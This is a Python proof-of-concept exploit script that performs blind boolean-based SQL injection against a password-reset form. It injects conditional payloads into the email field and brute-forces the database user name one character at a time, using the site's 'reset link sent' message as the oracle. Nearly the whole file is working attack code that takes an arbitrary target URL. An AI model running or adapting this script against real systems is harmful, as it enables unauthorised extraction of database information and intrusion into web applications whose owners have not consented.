from pwn import *
import requests, sys, time, string, argparse

def main():
    parser = argparse.ArgumentParser(
        description = "PoC script",
        epilog = "Usage example: python blid_extractor.py -u http://127.0.0.1:8080/resetPassword.php"
    )

    # Definition of arguments
    parser.add_argument("-u", "--url", type=str, help="Target URL (http://example.com:8080/resetPassword.php)")

    args = parser.parse_args()

    # Basic validation
    if not args.url:
        parser.error("URL is required (-u)")

    return args.url

url = main()

characters = string.ascii_lowercase + string.digits + string.punctuation

# Se definen dos variables para detectar el fin de la cadena
data0 = ""
data1 = ""

p1 = log.progress("Brute Force")
p1.status("Working...")

time.sleep(1)

p2 = log.progress("Data")


for position in range(1, 50):

    for character in characters:
        post_data = {"email": "' or 1=1 AND if((SUBSTR(user(),"+ str(position) +", 1)='"+ character +"'), 1, 0)-- -"}
        
        p1.status(post_data['email'])

        r = requests.post(url, data = post_data)

        if "A password reset link has been sent to your email address." in r.text:
            
            data0 += character
            p2.status(data0)
            break

    if data0 == data1:
        break
    else:
        data1 = data0
